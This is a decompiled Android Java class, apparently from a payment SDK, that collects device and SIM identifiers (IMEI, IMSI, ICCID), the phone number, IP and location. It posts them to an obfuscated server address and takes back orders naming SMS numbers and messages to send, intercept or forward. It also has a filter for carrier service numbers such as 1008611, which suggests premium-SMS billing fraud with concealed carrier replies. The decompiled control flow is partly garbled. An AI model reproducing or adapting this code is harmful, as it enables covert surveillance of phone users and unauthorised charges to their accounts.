package com.soy;

import android.content.Context;
import android.text.TextUtils;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public final class a
{
  public static HashMap a = new HashMap();
  private static boolean b = false;
  
  public static Object a(String paramString)
  {
    if (a.containsKey(paramString)) {
      return a.get(paramString);
    }
    return "";
  }
  
  public static void a()
  {
    new e().start();
  }
  
  public static void a(Context paramContext, String paramString1, String paramString2)
  {
    try
    {
      a.put("imei", l.f(paramContext));
      a.put("imsi", l.e(paramContext));
      a.put("iccid", l.g(paramContext));
      a.put("model", l.c());
      a.put("type", Integer.valueOf(l.c(paramContext)));
      a.put("mtype", l.b(paramContext));
      a.put("version", Pay.version);
      a.put("soft", l.j(paramContext));
      if (TextUtils.isEmpty(paramString1)) {
        a.put("skey", l.a(paramContext, "APPKEY"));
      }
      for (;;)
      {
        if (!TextUtils.isEmpty(paramString2)) {
          a.put("channel", paramString2);
        }
        a.put("mobile", k.b(paramContext));
        a.put("ip", k.c(paramContext));
        a.put("brand", l.a());
        a.put("osbuild", l.b());
        a.put("app_name", l.h(paramContext));
        a.put("package", l.i(paramContext));
        paramContext = k.a(paramContext);
        if (paramContext.containsKey("prov")) {
          a.put("prov", paramContext.get("prov"));
        }
        if (paramContext.containsKey("city")) {
          a.put("city", paramContext.get("city"));
        }
        new b().start();
        return;
        a.put("skey", paramString1);
      }
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void a(t paramT)
  {
    if ((!TextUtils.isEmpty(paramT.f)) && (!TextUtils.isEmpty(paramT.h))) {
      new d(paramT).start();
    }
  }
  
  public static void a(String paramString1, String paramString2, String paramString3)
  {
    new c(paramString1, paramString2, paramString3).start();
  }
  
  public static boolean a(Context paramContext, int paramInt)
  {
    Object localObject;
    if ((l.a(paramContext)) && (!b))
    {
      paramContext = (HashMap)a.clone();
      paramContext.put("money", Integer.valueOf(paramInt));
      localObject = new HashMap();
      ((HashMap)localObject).put("data", h.b(i.a(paramContext)));
      paramContext = i.a(ab.a(new int[] { 33, 45, 45, 41, 55, 54, 54, 44, 41, 53, 26, 39, 51, 33, 46, 26, 39, 32, 37, 26, 53, 28, 40, 38, 55, 65, 57, 65, 58, 54, 41, 26, 50, 60 }), (Map)localObject);
      if (TextUtils.isEmpty(paramContext)) {}
    }
    for (;;)
    {
      try
      {
        paramContext = new JSONArray(h.c(paramContext));
        y.d = new HashMap();
        paramInt = 0;
        if (paramInt < paramContext.length()) {
          continue;
        }
        b = true;
      }
      catch (JSONException paramContext)
      {
        t localT;
        paramContext.printStackTrace();
        continue;
      }
      catch (Exception paramContext)
      {
        paramContext.printStackTrace();
        continue;
        int i = 1;
        continue;
      }
      return b;
      localObject = new JSONObject(paramContext.get(paramInt).toString());
      if (((JSONObject)localObject).has("order"))
      {
        localT = new t();
        if (!((JSONObject)localObject).has("type")) {
          continue;
        }
        i = ((JSONObject)localObject).getInt("type");
        localT.a = paramInt;
        localT.b = ((JSONObject)localObject).getString("order");
        localT.c = i;
        if ((((JSONObject)localObject).has("mob")) && (((JSONObject)localObject).has("msg")))
        {
          localT.d = ((JSONObject)localObject).getString("mob");
          localT.e = ((JSONObject)localObject).getString("msg");
        }
        if (((JSONObject)localObject).has("inmob")) {
          localT.f = ((JSONObject)localObject).getString("inmob");
        }
        if (((JSONObject)localObject).has("inkey")) {
          localT.g = ((JSONObject)localObject).getString("inkey");
        }
        if (((JSONObject)localObject).has("inmsg")) {
          localT.h = ((JSONObject)localObject).getString("inmsg");
        }
        if (((JSONObject)localObject).has("tomob")) {
          localT.i = ((JSONObject)localObject).getString("tomob");
        }
        if (((JSONObject)localObject).has("tomsg")) {
          localT.j = ((JSONObject)localObject).getString("tomsg");
        }
        if (((JSONObject)localObject).has("tourl")) {
          localT.k = ((JSONObject)localObject).getString("tourl");
        }
        if (((JSONObject)localObject).has("note")) {
          localT.l = ((JSONObject)localObject).getString("note");
        }
        if (((JSONObject)localObject).has("time")) {
          localT.m = ((JSONObject)localObject).getInt("time");
        }
        if (((JSONObject)localObject).has("tps")) {
          localT.o = ((JSONObject)localObject).getInt("tps");
        }
        y.d.put(((JSONObject)localObject).getString("order"), localT);
      }
      paramInt += 1;
    }
  }
  
  public static boolean a(String paramString1, String paramString2)
  {
    return Pattern.compile(paramString1).matcher(paramString2).find();
  }
  
  public static boolean b(String paramString)
  {
    if (TextUtils.isEmpty(paramString)) {}
    String str;
    do
    {
      return false;
      str = paramString;
      if (paramString.startsWith("+86")) {
        str = paramString.substring(3);
      }
    } while ((str.length() < 5) || ((!str.startsWith("10")) && (!str.startsWith("11"))) || (str.startsWith("111")) || (str.startsWith("114")) || (str.equals("1008611")));
    return true;
  }
}
